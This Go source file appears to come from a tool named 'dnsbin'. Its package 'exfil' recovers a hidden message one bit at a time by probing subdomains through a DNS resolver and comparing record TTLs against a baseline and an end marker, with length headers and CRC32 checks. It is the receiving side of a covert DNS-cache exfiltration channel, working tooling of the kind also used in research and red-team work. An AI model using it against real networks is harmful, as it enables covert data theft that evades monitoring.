package exfil

import (
	"dnsbin/config"
	"dnsbin/utils"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"os"
	"sort"
	"sync"
	"time"
)

func Receive(cfg config.Config, shortUUID string, maxChars int, concurrency int) {
	fmt.Println("\033[33m--- DNS TTL Recovery (Go) ---\033[0m")
	fmt.Printf("\033[32m[+]\033[0m UUID: \033[32m%s\033[0m\n", shortUUID)

	startTime := time.Now()
	requestCount := 0

	// 1. Determine Baseline TTL
	baselineQuery := fmt.Sprintf("baseline.%s.%s", shortUUID, cfg.Domain)
	baselineTTL, err := utils.QueryTTL(baselineQuery, cfg.Resolver)
	requestCount++
	if err != nil {
		fmt.Printf("\033[31m[!!]\033[0m Error: Could not determine baseline TTL: %v\n", err)
		return
	}

	// 2. Determine END marker TTL
	endQuery := fmt.Sprintf("end.%s.%s", shortUUID, cfg.Domain)
	endTTL, err := utils.QueryTTL(endQuery, cfg.Resolver)
	requestCount++
	if err != nil {
		fmt.Println("\033[33m[-]\033[0m Warning: END marker not found. Falling back to Baseline TTL comparison.")
		endTTL = baselineTTL
	}

	fmt.Printf("\033[32m[+]\033[0m Baseline TTL: %d\n", baselineTTL)
	fmt.Printf("\033[32m[+]\033[0m End Marker TTL: %d\n", endTTL)

	// 3. Recover Header (3 bytes: Options + 2-byte Length)
	headerBytes := recoverBytes(cfg, shortUUID, 0, 3, endTTL, concurrency, &requestCount, false)
	if len(headerBytes) < 3 {
		fmt.Println("\033[31m[!!]\033[0m Error: Failed to recover header")
		return
	}

	options := headerBytes[0]
	expectedLen := int(binary.BigEndian.Uint16(headerBytes[1:3]))
	crcEnabled := (options & (1 << 2)) != 0

	fmt.Printf("\033[32m[+]\033[0m Options: 0x%02x (CRC32: %v)\n", options, crcEnabled)
	fmt.Printf("\033[32m[+]\033[0m Message Length: %d bytes\n", expectedLen)
	fmt.Println("-------------------------------------")

	var finalMessage []byte
	currentBytePos := 3
	var blockStatuses []string

	for len(finalMessage) < expectedLen {
		remaining := expectedLen - len(finalMessage)
		chunkSize := 256
		if remaining < chunkSize {
			chunkSize = remaining
		}

		// Recover Data Chunk
		chunk := recoverBytes(cfg, shortUUID, currentBytePos, chunkSize, endTTL, concurrency, &requestCount, true)
		currentBytePos += chunkSize

		if crcEnabled {
			// Recover CRC32 (4 bytes)
			recoveredCRCBytes := recoverBytes(cfg, shortUUID, currentBytePos, 4, endTTL, concurrency, &requestCount, false)
			currentBytePos += 4

			if len(recoveredCRCBytes) == 4 {
				recoveredCRC := binary.BigEndian.Uint32(recoveredCRCBytes)
				actualCRC := crc32.ChecksumIEEE(chunk)

				if recoveredCRC == actualCRC {
					blockStatuses = append(blockStatuses, fmt.Sprintf("\033[32m[OK]\033[0m Block %d-%d", len(finalMessage), len(finalMessage)+len(chunk)))
				} else {
					blockStatuses = append(blockStatuses, fmt.Sprintf("\033[31m[FAIL]\033[0m Block %d-%d", len(finalMessage), len(finalMessage)+len(chunk)))
				}
			}
		}

		finalMessage = append(finalMessage, chunk...)
	}

	if !cfg.Debug {
		fmt.Println()
	}

	if crcEnabled {
		fmt.Println("\n--- Integrity Summary ---")
		for _, status := range blockStatuses {
			fmt.Println(status)
		}
	}

	duration := time.Since(startTime)
	if !cfg.Debug {
		fmt.Println()
	}
	fmt.Println("-------------------------------------")
	fmt.Printf("\033[32m[+]\033[0m Time taken: %.3f seconds\n", duration.Seconds())
	fmt.Printf("\033[32m[+]\033[0m Bytes recovered: %d\n", len(finalMessage))
	fmt.Printf("\033[32m[+]\033[0m DNS Requests: %d\n", requestCount)
	if duration.Seconds() > 0 {
		fmt.Printf("\033[32m[+]\033[0m Average speed: %.2f bytes/sec\n", float64(len(finalMessage))/duration.Seconds())
	}
}

func recoverBytes(cfg config.Config, shortUUID string, startByte int, numBytes int, endTTL int, concurrency int, requestCount *int, stream bool) []byte {
	recovered := make([]byte, numBytes)
	var wg sync.WaitGroup
	sem := make(chan struct{}, concurrency)

	type bitResult struct {
		pos int
		val int
	}
	resultsChan := make(chan bitResult, numBytes*8)

	for i := 0; i < numBytes*8; i++ {
		wg.Add(1)
		bitPos := startByte*8 + i
		go func(pos int) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			query := fmt.Sprintf("%d.%s.%s", pos, shortUUID, cfg.Domain)
			currentTTL, err := utils.QueryTTL(query, cfg.Resolver)
			val := 0
			if err == nil && currentTTL <= endTTL {
				val = 1
			}
			resultsChan <- bitResult{pos: pos, val: val}
		}(bitPos)
	}

	wg.Wait()
	close(resultsChan)
	*requestCount += numBytes * 8

	bits := make([]bitResult, 0, numBytes*8)
	for res := range resultsChan {
		bits = append(bits, res)
	}
	sort.Slice(bits, func(i, j int) bool {
		return bits[i].pos < bits[j].pos
	})

	for i := 0; i < numBytes; i++ {
		var b byte
		for j := 0; j < 8; j++ {
			if bits[i*8+j].val == 1 {
				b |= (1 << (7 - j))
			}
		}
		recovered[i] = b
		if stream && !cfg.Debug {
			os.Stdout.Write([]byte{b})
		}
	}
	return recovered
}